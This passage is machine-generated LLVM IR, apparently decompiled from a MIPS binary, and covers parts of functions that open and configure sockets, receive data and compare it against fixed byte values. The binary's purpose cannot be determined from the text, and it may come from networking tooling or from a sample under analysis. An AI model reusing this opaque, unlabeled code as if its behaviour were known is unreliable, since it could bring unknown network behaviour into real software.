  store i32 %v3_400f0c, i32* %t9.global-to-local, align 4
  %v1_400f14 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_400f14, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400f0c)
  %v0_400f20 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400f20, i32* %a1.global-to-local, align 4
  %v3_400f24 = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_400f24, i32* %t9.global-to-local, align 4
  %v1_400f2c = load i32, i32* %s1.global-to-local, align 4
  %v2_400f2c = load i32, i32* %s0.global-to-local, align 4
  %v3_400f2c = add i32 %v2_400f2c, %v1_400f2c
  store i32 %v3_400f2c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400f24)
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  %v3_400f3c = load i32, i32* @global_var_449cc4.65, align 4
  store i32 %v3_400f3c, i32* %t9.global-to-local, align 4
  store i32 %v2_400a88, i32* %a1.global-to-local, align 4
  store i32 4096, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400f3c)
  store i32 -1, i32* %v1.global-to-local, align 4
  %v0_400f54 = load i32, i32* %v0.global-to-local, align 4
  %v2_400f54 = icmp eq i32 %v0_400f54, -1
  br i1 %v2_400f54, label %dec_label_pc_40121c, label %dec_label_pc_400f58

dec_label_pc_400f58:                              ; preds = %dec_label_pc_400e90
  %v3_400f5c = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_400f5c, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400f5c)
  %v0_400f70 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400f70, i32* %a1.global-to-local, align 4
  %v3_400f74 = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_400f74, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400f74)
  %v3_400f8c = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_400f8c, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400f8c)
  %v0_400fa0 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_400fa0, i32* %a1.global-to-local, align 4
  %v3_400fa4 = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_400fa4, i32* %t9.global-to-local, align 4
  %v1_400fac = load i32, i32* %s1.global-to-local, align 4
  %v2_400fac = load i32, i32* %v0.global-to-local, align 4
  %v3_400fac = add i32 %v2_400fac, %v1_400fac
  store i32 %v3_400fac, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400fa4)
  %v3_400fbc = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_400fbc, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400fbc)
  store i32 7, i32* %a0.global-to-local, align 4
  %v3_400fd4 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_400fd4, i32* %t9.global-to-local, align 4
  %v1_400fdc = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_400fdc, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400fd4)
  %v0_400fe8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400fe8, i32* %a1.global-to-local, align 4
  %v3_400fec = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_400fec, i32* %t9.global-to-local, align 4
  %v1_400ff4 = load i32, i32* %s1.global-to-local, align 4
  %v2_400ff4 = load i32, i32* %s0.global-to-local, align 4
  %v3_400ff4 = add i32 %v2_400ff4, %v1_400ff4
  store i32 %v3_400ff4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400fec)
  %v3_401004 = load i32, i32* @global_var_449bc4.62, align 4
  store i32 %v3_401004, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401004)
  %v0_401018 = load i32, i32* %v0.global-to-local, align 4
  %v1_401018 = icmp eq i32 %v0_401018, 0
  store i32 %v0_401018, i32* %s2.global-to-local, align 4
  br i1 %v1_401018, label %dec_label_pc_400f58.dec_label_pc_401028_crit_edge, label %dec_label_pc_4011c4

dec_label_pc_400f58.dec_label_pc_401028_crit_edge: ; preds = %dec_label_pc_400f58
  %v0_401028.pre = load i32, i32* %t9.global-to-local, align 4
  br label %dec_label_pc_401028

dec_label_pc_401028:                              ; preds = %dec_label_pc_400f58.dec_label_pc_401028_crit_edge, %dec_label_pc_4011c4
  %v0_401028 = phi i32 [ %v0_401028.pre, %dec_label_pc_400f58.dec_label_pc_401028_crit_edge ], [ %v3_4011e4, %dec_label_pc_4011c4 ]
  call void @__pseudo_call(i32 %v0_401028)
  %v3_401038 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_401038, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401038)
  %v0_40104c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_40104c, i32* %a1.global-to-local, align 4
  %v3_401050 = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_401050, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401050)
  %v3_401068 = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_401068, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401068)
  %v0_40107c = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_40107c, i32* %a1.global-to-local, align 4
  %v3_401080 = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_401080, i32* %t9.global-to-local, align 4
  %v1_401088 = load i32, i32* %s1.global-to-local, align 4
  %v2_401088 = load i32, i32* %v0.global-to-local, align 4
  %v3_401088 = add i32 %v2_401088, %v1_401088
  store i32 %v3_401088, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401080)
  %v3_401098 = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_401098, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401098)
  store i32 7, i32* %a0.global-to-local, align 4
  %v3_4010b0 = load i32, i32* @global_var_449ce0.54, align 4
  store i32 %v3_4010b0, i32* %t9.global-to-local, align 4
  %v1_4010b8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_4010b8, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4010b0)
  %v0_4010c4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4010c4, i32* %a1.global-to-local, align 4
  %v3_4010c8 = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_4010c8, i32* %t9.global-to-local, align 4
  %v1_4010d0 = load i32, i32* %s1.global-to-local, align 4
  %v2_4010d0 = load i32, i32* %s0.global-to-local, align 4
  %v3_4010d0 = add i32 %v2_4010d0, %v1_4010d0
  store i32 %v3_4010d0, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4010c8)
  %v3_4010e0 = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_4010e0, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4010e0)
  %v0_4010f4 = load i32, i32* %s1.global-to-local, align 4
  %v1_4010f4 = load i32, i32* %v0.global-to-local, align 4
  %v2_4010f4 = add i32 %v1_4010f4, %v0_4010f4
  store i32 %v2_4010f4, i32* %a0.global-to-local, align 4
  %v3_4010fc = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_4010fc, i32* %t9.global-to-local, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_408568.71 to i32), i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4010fc)
  %v3_401114 = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_401114, i32* %t9.global-to-local, align 4
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401114)
  %v0_401128 = load i32, i32* %s1.global-to-local, align 4
  %v1_401128 = load i32, i32* %v0.global-to-local, align 4
  %v2_401128 = add i32 %v1_401128, %v0_401128
  store i32 %v2_401128, i32* %a0.global-to-local, align 4
  %v3_40112c = load i32, i32* @global_var_449b78.59, align 4
  store i32 %v3_40112c, i32* %t9.global-to-local, align 4
  %v1_401134 = load i32, i32* %s5.global-to-local, align 4
  %v2_401134 = add i32 %v1_401134, 11
  store i32 %v2_401134, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40112c)
  store i32 %v2_400a78, i32* %a0.global-to-local, align 4
  %v3_401144 = load i32, i32* @global_var_449cc4.65, align 4
  store i32 %v3_401144, i32* %t9.global-to-local, align 4
  store i32 %v2_400a88, i32* %a1.global-to-local, align 4
  store i32 4096, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401144)
  %v3_40115c = load i32, i32* @global_var_449c3c.52, align 4
  store i32 %v3_40115c, i32* %t9.global-to-local, align 4
  %v0_401160 = load i32, i32* %v0.global-to-local, align 4
  %v1_401160 = load i32, i32* @s7, align 4
  %v2_401160 = icmp eq i32 %v0_401160, %v1_401160
  store i32 %v2_400a88, i32* %a0.global-to-local, align 4
  br i1 %v2_401160, label %dec_label_pc_4011c4, label %dec_label_pc_401164

dec_label_pc_401164:                              ; preds = %dec_label_pc_401028
  call void @__pseudo_call(i32 %v3_40115c)
  store i32 %v2_400a88, i32* %a0.global-to-local, align 4
  %v3_401178 = load i32, i32* @global_var_449d04.58, align 4
  store i32 %v3_401178, i32* %t9.global-to-local, align 4
  %v0_40117c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_40117c, i32* %a1.global-to-local, align 4
  store i32 %v2_400ab8, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401178)
  store i32 10, i32* %a1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_404288.73 to i32), i32* %t9.global-to-local, align 4
  %v0_401194 = load i32, i32* %v0.global-to-local, align 4
  %v1_401194 = load i32, i32* @s7, align 4
  %v2_401194 = icmp eq i32 %v0_401194, %v1_401194
  %v3_401194 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v3_401194, i32* %a0.global-to-local, align 4
  br i1 %v2_401194, label %dec_label_pc_4011c4, label %dec_label_pc_401198

dec_label_pc_401198:                              ; preds = %dec_label_pc_401164
  store i32 1, i32* %fp.global-to-local, align 4
  call void @__pseudo_call(i32 ptrtoint (i32* @global_var_404288.73 to i32))
  %v0_4011a8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4011a8, i32* %a0.global-to-local, align 4
  %v3_4011ac = load i32, i32* @global_var_449c50.75, align 4
  store i32 %v3_4011ac, i32* %t9.global-to-local, align 4
  store i32 9, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4011ac)
  br label %dec_label_pc_4011c4

dec_label_pc_4011c4:                              ; preds = %dec_label_pc_400f58, %dec_label_pc_401164, %dec_label_pc_401028, %dec_label_pc_401198
  %v3_4011c4 = load i32, i32* %v2_40121c, align 4
  store i32 %v3_4011c4, i32* %t9.global-to-local, align 4
  %v1_4011cc = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_4011cc, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4011c4)
  store i32 %v2_400a78, i32* %s1.global-to-local, align 4
  %v0_4011e0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4011e0, i32* %s5.global-to-local, align 4
  %v3_4011e4 = load i32, i32* @global_var_449cd8.68, align 4
  store i32 %v3_4011e4, i32* %t9.global-to-local, align 4
  store i32 4096, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 %v2_400a88, i32* %a0.global-to-local, align 4
  %v1_4011f4 = icmp ne i32 %v0_4011e0, 0
  store i32 -1, i32* @s7, align 4
  %v0_4011fc = load i32, i32* %fp.global-to-local, align 4
  %v1_4011fc = icmp eq i32 %v0_4011fc, 0
  %or.cond = and i1 %v1_4011f4, %v1_4011fc
  br i1 %or.cond, label %dec_label_pc_401028, label %dec_label_pc_401204

dec_label_pc_401204:                              ; preds = %dec_label_pc_4011c4
  %v3_401204 = load i32, i32* @global_var_449b2c.76, align 4
  store i32 %v3_401204, i32* %t9.global-to-local, align 4
  %v1_40120c = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_40120c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401204)
  br label %dec_label_pc_40121c

dec_label_pc_40121c:                              ; preds = %dec_label_pc_400e90, %dec_label_pc_400e78, %dec_label_pc_401204
  %v3_40121c = load i32, i32* %v2_40121c, align 4
  store i32 %v3_40121c, i32* %t9.global-to-local, align 4
  %v1_401224 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v1_401224, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40121c)
  %v0_401230 = load i32, i32* %v0.global-to-local, align 4
  %v1_401230 = icmp ne i32 %v0_401230, 0
  store i32 %v0_401230, i32* %a0.global-to-local, align 4
  %v0_401238 = load i32, i32* %fp.global-to-local, align 4
  %v1_401238 = icmp eq i32 %v0_401238, 0
  %or.cond1 = and i1 %v1_401230, %v1_401238
  br i1 %or.cond1, label %dec_label_pc_400e78, label %dec_label_pc_401240

dec_label_pc_401240:                              ; preds = %dec_label_pc_40121c
  %v3_401240 = load i32, i32* @global_var_449b2c.76, align 4
  store i32 %v3_401240, i32* %t9.global-to-local, align 4
  %v1_401248 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v1_401248, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401240)
  %v3_401258 = load i32, i32* @global_var_449cb0.77, align 4
  store i32 %v3_401258, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401258)
  %v3_401270 = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_401270, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401270)
  %v3_401288 = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_401288, i32* %t9.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401288)
  %v3_4012a0 = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_4012a0, i32* %t9.global-to-local, align 4
  store i32 7, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4012a0)
  %v3_4012b8 = load i32, i32* @global_var_449c68.61, align 4
  store i32 %v3_4012b8, i32* %t9.global-to-local, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4012b8)
  %v0_4012c8 = load i32, i32* %fp.global-to-local, align 4
  %v1_4012c8 = mul i32 %v0_4012c8, 16777216
  %v1_4012d0 = sdiv i32 %v1_4012c8, 16777216
  store i32 %v1_4012d0, i32* %v0.global-to-local, align 4
  store i32 0, i32* %s5.global-to-local, align 4
  ret i32 %v1_4012d0

; uselistorder directives
  uselistorder i32 %v1_4012d0, { 1, 0 }
  uselistorder i32 %v0_401230, { 1, 2, 0 }
  uselistorder i32 %v3_4011e4, { 1, 0 }
  uselistorder i32* %v2_40121c, { 1, 0 }
  uselistorder i32 %v4_400d24, { 1, 0 }
  uselistorder i32 %v3_400d1c, { 1, 0 }
  uselistorder i32 %v0_400d14, { 1, 0 }
  uselistorder i32 %v1_400d38, { 1, 0, 2 }
  uselistorder i32 %v3_400cf8, { 0, 2, 1 }
  uselistorder i32 %v3_400cf0, { 1, 0 }
  uselistorder i32 %v0_400d0018, { 1, 0 }
  uselistorder i32 %v0_400cd0, { 1, 0 }
  uselistorder i32 %v0_400d0020, { 1, 0 }
  uselistorder i32 %v2_400cf8, { 2, 3, 0, 1 }
  uselistorder i32 %v0_400cd013, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v4_400c24, { 1, 0 }
  uselistorder i32 %v3_400c1c, { 1, 0 }
  uselistorder i32 %v0_400c14, { 1, 0 }
  uselistorder i32 %v2_400c08, { 1, 0, 2, 3 }
  uselistorder i32 %v1_400c04, { 1, 2, 0, 3 }
  uselistorder i32 %v4_400bf8, { 1, 0 }
  uselistorder i32 %v3_400bf8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_400ae0, { 1, 0 }
  uselistorder i32 %v0_400ad0, { 1, 0 }
  uselistorder i32 %v2_400ab8, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_400aa0, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11 }
  uselistorder i32* %v0.global-to-local, { 0, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 23, 20, 1, 21, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 24, 25, 26, 27 }
  uselistorder i32* %t9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 65, 66, 67, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64 }
  uselistorder i32* %s5.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %s1.global-to-local, { 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 4, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %fp.global-to-local, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32* %a2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 18, 17 }
  uselistorder i32* %a1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 31, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %a0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 23, 22, 24, 25, 26, 28, 27, 29, 31, 30, 32, 33, 34, 35, 36, 37, 39, 38, 70, 71, 72, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69 }
  uselistorder i32 ptrtoint (i32* @global_var_405830.50 to i32), { 1, 4, 2, 5, 3, 6, 0, 7 }
  uselistorder label %dec_label_pc_40121c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_4011c4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_401028, { 1, 0 }
  uselistorder label %dec_label_pc_400e70, { 1, 0 }
  uselistorder label %dec_label_pc_400e34, { 1, 0 }
  uselistorder label %dec_label_pc_400d7c, { 5, 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_400d30, { 1, 0 }
  uselistorder label %dec_label_pc_400ce8, { 1, 0 }
  uselistorder label %dec_label_pc_400cd0, { 1, 0 }
  uselistorder label %dec_label_pc_400ccc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_400cc4, { 1, 0 }
  uselistorder label %dec_label_pc_400c30, { 1, 0 }
  uselistorder label %dec_label_pc_400be0, { 1, 0 }
  uselistorder label %dec_label_pc_400b3c, { 1, 0 }
}

define i32 @function_401304() local_unnamed_addr {
dec_label_pc_401304:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* @s3, align 4
  %v3_401330 = load i32, i32* @global_var_449ca4.78, align 4
  store i32 %v3_401330, i32* @t9, align 4
  %v4_401340 = call i32 @function_406010(i32 2, i32 2, i32 0)
  store i32 1, i32* @s1, align 4
  %v3_401354 = load i32, i32* @global_var_449c34.79, align 4
  store i32 %v3_401354, i32* @t9, align 4
  %v2_40135c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_40135c, i32* @a3, align 4
  %v2_401368 = icmp eq i32 %v4_401340, -1
  store i32 %v4_401340, i32* @global_var_4498d4.6, align 4
  br i1 %v2_401368, label %dec_label_pc_401438, label %dec_label_pc_40136c

dec_label_pc_40136c:                              ; preds = %dec_label_pc_401304
  store i32 1, i32* %stack_var_-48, align 4
  %v11_401378 = call i32 @function_405f90(i32 %v4_401340, i32 65535, i32 4, i32* nonnull %stack_var_-48, i32 4)
  %v3_401384 = load i32, i32* @global_var_4498d4.6, align 4
  store i32 %v3_401384, i32* @s0, align 4
  %v3_401388 = load i32, i32* @global_var_449b24.80, align 4
  store i32 %v3_401388, i32* @t9, align 4
  store i32 %v3_401384, i32* @a0, align 4
  store i32 3, i32* @a1, align 4
  %v1_401394 = call i32 @function_404c80()
  %v0_4013a0 = load i32, i32* @s0, align 4
  store i32 %v0_4013a0, i32* @a0, align 4
  %v3_4013a4 = load i32, i32* @global_var_449b24.80, align 4
  store i32 %v3_4013a4, i32* @t9, align 4
  store i32 4, i32* @a1, align 4
  %v1_4013ac = call i32 @function_404c80()
  %v0_4013bc = load i32, i32* @s3, align 4
  %v1_4013bc = load i32, i32* @s1, align 4
  %v2_4013bc = icmp eq i32 %v0_4013bc, %v1_4013bc
  br i1 %v2_4013bc, label %dec_label_pc_4013d0, label %dec_label_pc_4013c0

dec_label_pc_4013c0:                              ; preds = %dec_label_pc_40136c
  br label %dec_label_pc_4013d0

dec_label_pc_4013d0:                              ; preds = %dec_label_pc_40136c, %dec_label_pc_4013c0
  %v3_4013d4 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_4013d4, i32* @t9, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v6_4013e4 = call i32 @function_4057a0()
  %v1_4013f0 = inttoptr i32 %v6_4013e4 to i32*
  store i32 0, i32* %v1_4013f0, align 4
  %v3_4013f4 = load i32, i32* @global_var_449a78.2, align 4
  store i32 %v3_4013f4, i32* @s1, align 4
  %v3_4013f8 = load i32, i32* @global_var_449c48.84, align 4
  store i32 %v3_4013f8, i32* @t9, align 4
  %v3_401400 = load i32, i32* @global_var_4498d4.6, align 4
  store i32 %v6_4013e4, i32* @s0, align 4
  %v5_40140c = bitcast i32* %stack_var_-44 to %sockaddr*
  %v6_40140c = call i32 @function_405c50(i32 %v3_401400, %sockaddr* %v5_40140c, i32 16)
  %v1_401418 = icmp eq i32 %v6_40140c, 0
  br i1 %v1_401418, label %dec_label_pc_4013d0.dec_label_pc_401454_crit_edge, label %dec_label_pc_40141c

dec_label_pc_4013d0.dec_label_pc_401454_crit_edge: ; preds = %dec_label_pc_4013d0
  %v0_401454.pre = load i32, i32* @s3, align 4
  br label %dec_label_pc_401454

dec_label_pc_40141c:                              ; preds = %dec_label_pc_4013d0
  %v0_401420 = load i32, i32* @s0, align 4
  %v1_401420 = inttoptr i32 %v0_401420 to i32*
  %v2_401420 = load i32, i32* %v1_401420, align 4
  %v2_401428 = icmp eq i32 %v2_401420, 126
  br i1 %v2_401428, label %dec_label_pc_401438, label %dec_label_pc_40142c

dec_label_pc_40142c:                              ; preds = %dec_label_pc_40141c
  %v2_401430 = icmp eq i32 %v2_401420, 13
  br i1 %v2_401430, label %dec_label_pc_401438, label %dec_label_pc_401480

dec_label_pc_401438:                              ; preds = %dec_label_pc_40142c, %dec_label_pc_40141c, %dec_label_pc_401304
  %v0_401438 = load i32, i32* @s3, align 4
  %v1_401438 = add i32 %v0_401438, 1
  %v1_40143c = urem i32 %v1_401438, 256
  %v2_401444 = icmp eq i32 %v1_40143c, 3
  br i1 %v2_401444, label %dec_label_pc_401504, label %dec_label_pc_401454

dec_label_pc_401454:                              ; preds = %dec_label_pc_4013d0.dec_label_pc_401454_crit_edge, %dec_label_pc_401438
  %v0_401454 = phi i32 [ %v0_401454.pre, %dec_label_pc_4013d0.dec_label_pc_401454_crit_edge ], [ %v1_40143c, %dec_label_pc_401438 ]
  %v1_401454 = icmp ult i32 %v0_401454, 2
  %v1_401458 = icmp eq i1 %v1_401454, false
  br i1 %v1_401458, label %dec_label_pc_401500, label %dec_label_pc_40145c

dec_label_pc_40145c:                              ; preds = %dec_label_pc_401454
  %v3_401460 = load i32, i32* @global_var_449c04.85, align 4
  store i32 %v3_401460, i32* @t9, align 4
  %v0_401464 = load i32, i32* @s1, align 4
  %v1_401464 = add i32 %v0_401464, -26412
  %v2_401464 = inttoptr i32 %v1_401464 to i32*
  %v3_401464 = load i32, i32* %v2_401464, align 4
  %v3_401468 = call i32 @function_405df0(i32 %v3_401464, i32 1)
  br label %dec_label_pc_401480

dec_label_pc_401480:                              ; preds = %dec_label_pc_40142c, %dec_label_pc_40145c
  %v3_401480 = load i32, i32* @global_var_449d10.86, align 4
  store i32 %v3_401480, i32* @t9, align 4
  %v0_401484 = load i32, i32* @s1, align 4
  %v1_401484 = add i32 %v0_401484, -26412
  %v2_401484 = inttoptr i32 %v1_401484 to i32*
  %v3_401484 = load i32, i32* %v2_401484, align 4
  store i32 16, i32* @a2, align 4
  %v4_401488 = call i32 @function_405cb0(i32 %v3_401484, %sockaddr* inttoptr (i32 16 to %sockaddr*))
  store i32 %v4_401488, i32* @v0, align 4
  %v3_401498 = load i32, i32* @global_var_449cb0.77, align 4
  store i32 %v3_401498, i32* @t9, align 4
  %v2_4014a0 = call i32 @function_4069b0(i32 5)
  %v0_4014ac = load i32, i32* @s1, align 4
  %v1_4014ac = add i32 %v0_4014ac, -26412
  %v2_4014ac = inttoptr i32 %v1_4014ac to i32*
  %v3_4014ac = load i32, i32* %v2_4014ac, align 4
  %v3_4014b0 = load i32, i32* @global_var_449b1c.60, align 4
  store i32 %v3_4014b0, i32* @t9, align 4
  %v2_4014b8 = call i32 @function_404de0(i32 %v3_4014ac)
  store i32 %v2_4014b8, i32* @v0, align 4
  %v3_4014c8 = load i32, i32* @global_var_449ccc.87, align 4
  store i32 %v3_4014c8, i32* @t9, align 4
  %v2_4014d0 = call i32 @function_400a30(i32 58811)
  %v3_4014e0 = load i32, i32* @global_var_449a80.88, align 4
  %v1_4014e8 = add i32 %v3_4014e0, 4868
  call void @__pseudo_call(i32 %v1_4014e8)
  br label %dec_label_pc_401500

dec_label_pc_401500:                              ; preds = %dec_label_pc_401454, %dec_label_pc_401480
  br label %dec_label_pc_401504

dec_label_pc_401504:                              ; preds = %dec_label_pc_401438, %dec_label_pc_401500
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_40143c, { 1, 0 }
  uselistorder i32 %v4_401340, { 0, 2, 1 }
  uselistorder i32 13, { 1, 0, 2 }
  uselistorder label %dec_label_pc_401504, { 1, 0 }
  uselistorder label %dec_label_pc_401500, { 1, 0 }
  uselistorder label %dec_label_pc_401480, { 1, 0 }
  uselistorder label %dec_label_pc_401454, { 1, 0 }
  uselistorder label %dec_label_pc_4013d0, { 1, 0 }
}

define i32 @function_401520(i32* %arg1) local_unnamed_addr {
dec_label_pc_401520:
  %a1.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %a1.global-to-local, align 4
  %stack_var_-1380 = alloca i32, align 4
  %stack_var_-1376 = alloca i32, align 4
  %stack_var_-1372 = alloca i32, align 4
  %stack_var_-1384 = alloca i16, align 2
  %stack_var_-1364 = alloca i32, align 4
  %stack_var_-1060 = alloca i32, align 4
  %stack_var_-1188 = alloca i32, align 4
  %stack_var_-1316 = alloca i32, align 4
  %stack_var_-1348 = alloca i32, align 4
  %v1_401528 = load i32, i32* @t9, align 4
  %v2_401528 = add i32 %v1_401528, 329024
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v0_401544 = load i32, i32* @s2, align 4
  %v0_401548 = load i32, i32* @s1, align 4
  %v3_401554 = load i32, i32* @global_var_449c10.89, align 4
  store i32 %v3_401554, i32* @t9, align 4
  %v2_401558 = load i32, i32* %arg1, align 4
  %v3_40155c = load i32, i32* @global_var_449a7c.8, align 4
  store i32 %v3_40155c, i32* @s1, align 4
  %v2_401560 = inttoptr i32 %v2_401558 to i8*
  %v3_401560 = call i32 @function_405310(i8* %v2_401560)
  store i32 %v3_401560, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  store i32 1, i32* %a1.global-to-local, align 4
  %v3_401570 = load i32, i32* @global_var_449c20.18, align 4
  store i32 %v3_401570, i32* @t9, align 4
  %v3_401578 = call i32 @function_406070(i32 18, i32 1)
  store i32 %v3_401578, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
  %v3_401588 = load i32, i32* @global_var_449b18.90, align 4
  store i32 %v3_401588, i32* @t9, align 4
  %v1_401590 = call i32 @function_4006d0()
  store i32 %v1_401590, i32* %v0.global-to-local, align 4
  store i32 %v2_401528, i32* %gp.global-to-local, align 4
